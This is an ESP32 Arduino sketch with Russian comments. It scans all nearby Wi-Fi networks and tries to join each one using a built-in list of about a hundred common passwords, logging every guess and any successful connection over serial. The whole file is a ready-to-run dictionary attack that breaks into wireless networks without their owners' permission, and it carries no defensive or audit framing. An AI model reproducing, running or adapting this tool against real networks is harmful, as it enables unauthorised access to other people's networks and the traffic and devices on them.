#include "WiFi.h"

const char* passwords[] = {
    "12345678z",
    "password",
    "123456789",
    "1234567890",
    "qwertyuiop",
    "1234567a",
    "1q2w3e4r5t",
    "1234abcd",
    "qwerty123",
    "1qaz2wsx",
    "a1b2c3d4",
    "abc12345",
    "11111111",
    "123123123",
    "1234qwer",
    "aa123456",
    "123qweasd",
    "q1w2e3r4t5",
    "12345qwert",
    "zxcvbnm123",
    "123456abc",
    "1q2w3e4r",
    "1qazxsw2",
    "zaq12wsx",
    "asdfghjkl",
    "qweasdzxc",
    "password1",
    "qazwsxedc",
    "123qwe123",
    "qwe123qwe",
    "1234abcd!",
    "asdf1234",
    "q1w2e3r4!",
    "1q2w3e4r5t6y",
    "1234qwer!",
    "a1234567",
    "abcd1234",
    "1a2b3c4d",
    "a1s2d3f4",
    "qwer1234",
    "zxcvbnm,./",
    "1qaz@WSX",
    "12345678",
    "password",
    "123456789",
    "1234567890",
    "1234567",
    "12345",
    "1234",
    "111111",
    "123123",
    "admin",
    "000000",
    "qwerty",
    "abc123",
    "1q2w3e4r",
    "123321",
    "654321",
    "987654321",
    "default",
    "123qwe",
    "qweasd",
    "1qaz2wsx",
    "123",
    "football",
    "monkey",
    "696969",
    "letmein",
    "master",
    "666666",
    "7777777",
    "888888",
    "princess",
    "qwertyuiop",
    "superman",
    "iloveyou",
    "starwars",
    "dragon",
    "passw0rd",
    "trustno1",
    "555555",
    "121212",
    "123123123",
    "123abc",
    "00000000",
    "qwerty123",
    "zxcvbnm",
    "asdfghjkl",
    "q1w2e3r4",
    "admin123",
    "welcome",
    "sunshine",
    "pa55word",
    "passw0rd",
    "abcdefgh",
    "qwertyui",
    "1q2w3e4r5t6y7u8i",
    "1234qwerasdf",
};
const int passwordsCount = sizeof(passwords) / sizeof(passwords[0]);

void setup() {
  Serial.begin(115200);

  // Инициализация Wi-Fi в режиме STA (station)
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  Serial.println("Сканирование Wi-Fi сетей...");
  int networkCount = WiFi.scanNetworks();
  Serial.println("Сканирование завершено");

  if (networkCount == 0) {
    Serial.println("Сети не найдены");
  } else {
    Serial.print(networkCount);
    Serial.println(" сетей найдено");

    for (int i = 0; i < networkCount; ++i) {
      for (int j = 0; j < passwordsCount; ++j) {
        Serial.print("Пытаемся подключиться к сети: ");
        Serial.print(WiFi.SSID(i));
        Serial.print(" с паролем: ");
        Serial.println(passwords[j]);

        WiFi.begin(WiFi.SSID(i).c_str(), passwords[j]);

        int maxAttempts = 10;
        int attempt = 0;
        while (WiFi.status() != WL_CONNECTED && attempt < maxAttempts) {
          delay(1000);
          Serial.print(".");
          attempt++;
        }

        if (WiFi.status() == WL_CONNECTED) {
          Serial.println("");
          Serial.println("Wi-Fi подключен.");
          Serial.print("IP-адрес: ");
          Serial.println(WiFi.localIP());
          WiFi.disconnect();
          delay(1000);
          break; // Выходим из цикла паролей, если подключение успешно
        } else {
          Serial.println("");
          Serial.println("Не удалось подключиться к Wi-Fi с этим паролем.");
        }
      }
    }
  }
  Serial.println("Сканирование и попытки подключения завершены");
}

void loop() {
  // Пустой цикл
}